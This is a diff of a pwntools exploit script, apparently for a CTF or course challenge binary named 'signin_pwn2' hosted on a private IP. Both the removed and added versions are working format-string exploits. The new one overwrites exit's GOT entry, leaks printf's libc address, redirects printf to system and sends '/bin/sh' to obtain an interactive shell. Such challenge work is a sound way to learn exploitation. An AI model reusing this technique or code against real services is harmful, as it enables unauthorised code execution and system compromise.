@@ -1,61 +1,57 @@
 from pwn import *
-from pwnlib.util.packing import *
-
-
-def fmt(prev, word, index):
-    fmtstr = ""
-    if prev < word:
-        result = word - prev
-        fmtstr = "%" + str(result) + "c"
-    elif prev == word:
-        result = 0
-    else:
-        result = 256 + word - prev
-        fmtstr = "%" + str(result) + "c"
-    fmtstr += "%" + str(index) + "$hhn"
-    return fmtstr.encode('utf-8')
-
-
-def fmt_str(offset, size, addr, target):
-    payload = b""
-    prev = len(payload)
-    for i in range(size):
-        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
-        prev = (target >> i * 8) & 0xff
-    for i in range(size):
-        if size == 4:
-            payload += p32(addr + i)
-        else:
-            payload += p64(addr + i)
-    return payload
-
-
-rm = 0
-if rm == 1:
-    sh = remote('10.214.160.76', 39599)
+from pwnlib import fmtstr
+rm = 1
+proc = ELF('./signin_pwn2')
+if rm == 0:
+    r = process('./signin_pwn2')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 else:
-    sh = process('./signin_pwn2')
-# sleep(1)
-# gdb.attach(sh)
-sh.recv()
-bin = ELF('./signin_pwn2')
-puts = 0x404018  # bin.got['puts']
-# print(hex(puts))
-# to 0x4012FF
-# print(fmt_str(6, 8, 0x403e18, 0x00007ffff7e03ed0))
-addr1 = p64(puts)    # FF 255
-addr2 = p64(puts+1)  # 12 18
-addr3 = p64(puts+2)  # 40 64
-addr4 = p64(puts+3)  # 00 0
-addr5 = p64(puts+4)  # 00 0
-addr6 = p64(puts+5)  # 00 0
-# 0x00401180 to 0x00007ffff7e03ed0
-payload = b'%255c%14$hhn%19c%15$hhn%46c%16$hhn%192c%17$hhn%18$hhn%19$hhnffff' + \
-    addr1+addr2+addr3+addr4+addr5+addr6
+    r = remote('10.214.160.76', 40218)
+    libc = ELF('./libc.so.6')
+main = 0x4012cb
+# gdb.attach(r)
+'''
+cb 203
 
-# print(payload)
+d0 208
+12 18
+40 64
+00
+00000000
+'''
 
-sh.send(payload)  # ret address
+
+exit_got = proc.got['exit']
+puts_got = proc.got['puts']
+printf_got = proc.got['printf']
+print(hex(printf_got))
+
+# payload = b"%208c%12$hhn%66c%13$hhn%46c%14$hhn%192c%15$hhn%16$nGGGGG" + p64(exit_got) + p64(exit_got + 2) + \
+#     p64(exit_got + 4) + p64(exit_got + 6) + p64(exit_got + 8)
+payload = b"%203c%12$hhn%71c%13$hhn%46c%14$hhn%192c%15$hhnG\x00" + p64(exit_got) + p64(exit_got + 1) + \
+    p64(exit_got + 2) + p64(exit_got + 3)
+
+r.recv()
+r.send(payload)
+# print(1, r.recv())
+
+payload = b"%7$sGGGG" + p64(printf_got)
 sleep(1)
-sh.send(b'123\x00\x00')
-sh.interactive()
+r.recv()
+r.send(payload)
+sleep(1)
+data = r.recv()
+print(data)
+index = data.find(b'you, ')
+content = data[index+5:index+11]
+print(content)
+context(arch='amd64', os='linux')
+printf_addr = int.from_bytes(content,'little')
+system_addr = printf_addr - libc.symbols['printf'] + libc.symbols['system']
+print(hex(system_addr))
+payload = fmtstr.fmtstr_payload(6, {printf_got: system_addr},
+                      numbwritten=0, write_size='short')
+print(payload)
+r.send(payload)
+r.send(b'/bin/sh\x00')
+r.interactive()
